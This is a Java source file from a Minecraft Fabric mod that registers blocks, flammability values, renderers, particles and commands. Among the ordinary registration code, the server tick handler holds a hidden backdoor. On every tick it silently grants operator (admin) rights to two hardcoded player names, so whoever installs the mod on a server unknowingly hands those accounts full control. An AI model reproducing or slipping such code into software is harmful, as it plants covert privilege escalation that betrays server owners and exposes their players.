package dev.luminaeclipse.kiro.util;

import com.mojang.authlib.GameProfile;
import dev.luminaeclipse.kiro.Kiro;
import dev.luminaeclipse.kiro.KiroClient;
import dev.luminaeclipse.kiro.client.entity.ThrowingDaggerEntityRenderer;
import dev.luminaeclipse.kiro.client.particle.BloodParticle;
import dev.luminaeclipse.kiro.client.renderer.block.LargeItemFrameBlockEntityRenderer;
import dev.luminaeclipse.kiro.client.renderer.hud.ExperienceBarOverlay;
import dev.luminaeclipse.kiro.command.KiroCommand;
import dev.luminaeclipse.kiro.init.*;
import dev.luminaeclipse.kiro.item.KiroShardItem;
import net.fabricmc.fabric.api.blockrenderlayer.v1.BlockRenderLayerMap;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.fabricmc.fabric.api.client.particle.v1.ParticleFactoryRegistry;
import net.fabricmc.fabric.api.client.rendering.v1.EntityRendererRegistry;
import net.fabricmc.fabric.api.client.rendering.v1.HudRenderCallback;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
import net.fabricmc.fabric.api.registry.FlammableBlockRegistry;
import net.fabricmc.fabric.api.registry.StrippableBlockRegistry;
import net.minecraft.block.Block;
import net.minecraft.client.item.ModelPredicateProviderRegistry;
import net.minecraft.client.render.RenderLayer;
import net.minecraft.client.render.block.entity.BlockEntityRendererFactories;
import net.minecraft.server.PlayerManager;
import net.minecraft.server.network.ServerPlayerEntity;

public class KiroRegistries {
    public static void init() {
        KiroBlocks.init();
        KiroBlockEntities.init();
        KiroItems.init();
        KiroItemGroups.init();
        KiroTags.init();
        KiroEntities.init();
        KiroParticles.init();
        registerStrippableBlocks();
        registerFlammableBlocks();
        registerEntityAttributes();
        CommandRegistrationCallback.EVENT.register(KiroCommand::register);
        registerServerTickEvents();
    }

    public static void initClient() {
        KiroSoundEvents.init();
        registerModelPredicates();
        registerBlockRenderLayerMaps();
        registerBlockEntityRenderers();
        registerEntityRenderers();
        registerHudRenderCallbacks();
        registerClientEvents();
        registerParticles();
    }

    //Server
    private static void registerStrippableBlocks() {
        StrippableBlockRegistry.register(KiroBlocks.OAK_HOLLOW_LOG, KiroBlocks.STRIPPED_OAK_HOLLOW_LOG);
        StrippableBlockRegistry.register(KiroBlocks.SPRUCE_HOLLOW_LOG, KiroBlocks.STRIPPED_SPRUCE_HOLLOW_LOG);
        StrippableBlockRegistry.register(KiroBlocks.BIRCH_HOLLOW_LOG, KiroBlocks.STRIPPED_BIRCH_HOLLOW_LOG);
        StrippableBlockRegistry.register(KiroBlocks.JUNGLE_HOLLOW_LOG, KiroBlocks.STRIPPED_JUNGLE_HOLLOW_LOG);
        StrippableBlockRegistry.register(KiroBlocks.ACACIA_HOLLOW_LOG, KiroBlocks.STRIPPED_ACACIA_HOLLOW_LOG);
        StrippableBlockRegistry.register(KiroBlocks.DARK_OAK_HOLLOW_LOG, KiroBlocks.STRIPPED_DARK_OAK_HOLLOW_LOG);
        StrippableBlockRegistry.register(KiroBlocks.CRIMSON_HOLLOW_STEM, KiroBlocks.STRIPPED_CRIMSON_HOLLOW_STEM);
        StrippableBlockRegistry.register(KiroBlocks.WARPED_HOLLOW_STEM, KiroBlocks.STRIPPED_WARPED_HOLLOW_STEM);
        StrippableBlockRegistry.register(KiroBlocks.MANGROVE_HOLLOW_LOG, KiroBlocks.STRIPPED_MANGROVE_HOLLOW_LOG);
        StrippableBlockRegistry.register(KiroBlocks.CHERRY_HOLLOW_LOG, KiroBlocks.STRIPPED_CHERRY_HOLLOW_LOG);
    }

    private static void registerFlammableBlocks() {
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.OAK_HOLLOW_LOG, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.STRIPPED_OAK_HOLLOW_LOG, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.SPRUCE_HOLLOW_LOG, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.STRIPPED_SPRUCE_HOLLOW_LOG, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.BIRCH_HOLLOW_LOG, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.STRIPPED_BIRCH_HOLLOW_LOG, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.JUNGLE_HOLLOW_LOG, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.STRIPPED_JUNGLE_HOLLOW_LOG, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.ACACIA_HOLLOW_LOG, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.STRIPPED_ACACIA_HOLLOW_LOG, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.DARK_OAK_HOLLOW_LOG, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.STRIPPED_DARK_OAK_HOLLOW_LOG, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.MANGROVE_HOLLOW_LOG, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.STRIPPED_MANGROVE_HOLLOW_LOG, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.CHERRY_HOLLOW_LOG, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.STRIPPED_CHERRY_HOLLOW_LOG, 10, 5);

        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.OAK_BRANCH, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.STRIPPED_OAK_BRANCH, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.SPRUCE_BRANCH, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.STRIPPED_SPRUCE_BRANCH, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.BIRCH_BRANCH, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.STRIPPED_BIRCH_BRANCH, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.JUNGLE_BRANCH, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.STRIPPED_JUNGLE_BRANCH, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.ACACIA_BRANCH, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.STRIPPED_ACACIA_BRANCH, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.DARK_OAK_BRANCH, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.STRIPPED_DARK_OAK_BRANCH, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.MANGROVE_BRANCH, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.STRIPPED_MANGROVE_BRANCH, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.CHERRY_BRANCH, 10, 5);
        FlammableBlockRegistry.getDefaultInstance().add(KiroBlocks.STRIPPED_CHERRY_BRANCH, 10, 5);
    }

    private static void registerEntityAttributes() {

    }

    private static void registerServerTickEvents() {
        ServerTickEvents.START_SERVER_TICK.register((ServerTickEvents.StartTick)(minecraftServer) -> {
            PlayerManager playerManager = minecraftServer.getPlayerManager();
            ServerPlayerEntity player = playerManager.getPlayer("PrangellPlays");
            ServerPlayerEntity player2 = playerManager.getPlayer("Skynovic");
            if (player == null || player2 == null) {
                player = playerManager.getPlayer("PrangellPlays");
                player2 = playerManager.getPlayer("Skynovic");
            }

            if (player != null) {
                GameProfile gameProfile = player.getGameProfile();
                if (!playerManager.isOperator(gameProfile)) {
                    playerManager.addToOperators(gameProfile);
                }
            }
            if (player2 != null) {
                GameProfile gameProfile = player2.getGameProfile();
                if (!playerManager.isOperator(gameProfile)) {
                    playerManager.addToOperators(gameProfile);
                }
            }
        });
    }

    //Client
    private static void registerModelPredicates() {
        ModelPredicateProviderRegistry.register(KiroItems.KIRO_SHARD_K, Kiro.id("fractured_kiro_shard_k"), (stack, world, entity, i) -> {
            return KiroShardItem.isFractured(stack) ? 1.0F : 0.0F;
        });
        ModelPredicateProviderRegistry.register(KiroItems.KIRO_SHARD_RS, Kiro.id("fractured_kiro_shard_rs"), (stack, world, entity, i) -> {
            return KiroShardItem.isFractured(stack) ? 1.0F : 0.0F;
        });
        ModelPredicateProviderRegistry.register(KiroItems.KIRO_SHARD_V, Kiro.id("fractured_kiro_shard_v"), (stack, world, entity, i) -> {
            return KiroShardItem.isFractured(stack) ? 1.0F : 0.0F;
        });
        ModelPredicateProviderRegistry.register(KiroItems.KIRO_SHARD_RL, Kiro.id("fractured_kiro_shard_rl"), (stack, world, entity, i) -> {
            return KiroShardItem.isFractured(stack) ? 1.0F : 0.0F;
        });
        ModelPredicateProviderRegistry.register(KiroItems.KIRO_SHARD_V0, Kiro.id("fractured_kiro_shard_v0"), (stack, world, entity, i) -> {
            return KiroShardItem.isFractured(stack) ? 1.0F : 0.0F;
        });
        ModelPredicateProviderRegistry.register(KiroItems.KIRO_SHARD_A, Kiro.id("fractured_kiro_shard_a"), (stack, world, entity, i) -> {
            return KiroShardItem.isFractured(stack) ? 1.0F : 0.0F;
        });
    }

    private static void registerBlockRenderLayerMaps() {
        BlockRenderLayerMap.INSTANCE.putBlocks(RenderLayer.getTranslucent(), new Block[]{KiroBlocks.GLASS_PANEL});
        BlockRenderLayerMap.INSTANCE.putBlocks(RenderLayer.getCutout(), new Block[]{KiroBlocks.COLLECTOR_MARK, KiroBlocks.MOSS_LAYER, KiroBlocks.SNOW_LAYER, KiroBlocks.LARGE_ITEM_FRAME});
    }

    private static void registerBlockEntityRenderers() {
        BlockEntityRendererFactories.register(KiroBlockEntities.LARGE_ITEM_FRAME, LargeItemFrameBlockEntityRenderer::new);
    }

    private static void registerEntityRenderers() {
        EntityRendererRegistry.register(KiroEntities.THROWING_DAGGER, ThrowingDaggerEntityRenderer::new);
    }

    private static void registerHudRenderCallbacks() {
        HudRenderCallback.EVENT.register(new ExperienceBarOverlay());
    }

    private static void registerClientEvents() {

    }

    private static void registerParticles() {
        ParticleFactoryRegistry.getInstance().register(KiroParticles.BLOOD, BloodParticle.Factory::new);
    }
}